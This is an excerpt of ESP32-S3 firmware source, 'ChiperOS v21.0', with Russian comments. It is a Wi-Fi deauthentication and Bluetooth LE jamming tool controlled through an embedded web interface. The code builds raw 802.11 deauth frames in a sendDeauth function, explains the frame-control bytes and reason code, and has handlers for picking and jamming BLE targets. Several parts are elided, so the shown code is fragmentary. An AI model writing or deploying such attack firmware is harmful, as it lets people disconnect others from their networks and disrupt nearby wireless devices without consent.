/*
 * ChiperOS v21.0 - ESP32-S3 DEAUTH + WEB CONTROL
 * Компилировать через GitHub Actions с патчем patch_deauth.py
 * Поместить в src/main.cpp
 */
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
...
void checkChannel(){  if(!isLocked || millis()-tLock<20000) return;
...
void sendDeauth(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    ...
    // Frame Ctrl: Type 0 (Mgmt), Subtype 12 (Deauth) -> 0xC0 0x00
    ...
    packet[24] = 0x07; packet[25] = 0x00; // Reason: Class 3 frame from nonassoc STA
    
    // КРИТИЧНО: WIFI_IF_AP + false (отключаем системную нумерацию)
...
void hBleSel(){
  String m=srv.arg("m");
  if(m.length()==17){    int b[6]; sscanf(m.c_str(),"%x:%x:%x:%x:%x:%x",&b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
...
void hBleJam(){
  if(srv.arg("on")=="1"){
    if(memcmp(bleTgt,(uint8_t[6]){0},6)==0){ srv.send(400,"application/json","{\"ok\":false,\"msg\":\"SELECT BLE TARGET\"}"); return; }
...
<div class='hd'><div class='kc'>KOSMOC CREATOR</div><div class='vr'>ChiperOS v21.0 - PATCHED</div><div class='bd'>ESP32-S3</div></div>
<div class='ct'>
<div class='tabs'>
<div class='tab a' onclick='sw("w")'>WIFI</div><div class='tab' onclick='sw("b")'>BLE</div><div class='tab' onclick='sw("a")'>AP</div></div>
...
setInterval(st,1000);st();</script></body></html>
)rawliteral";
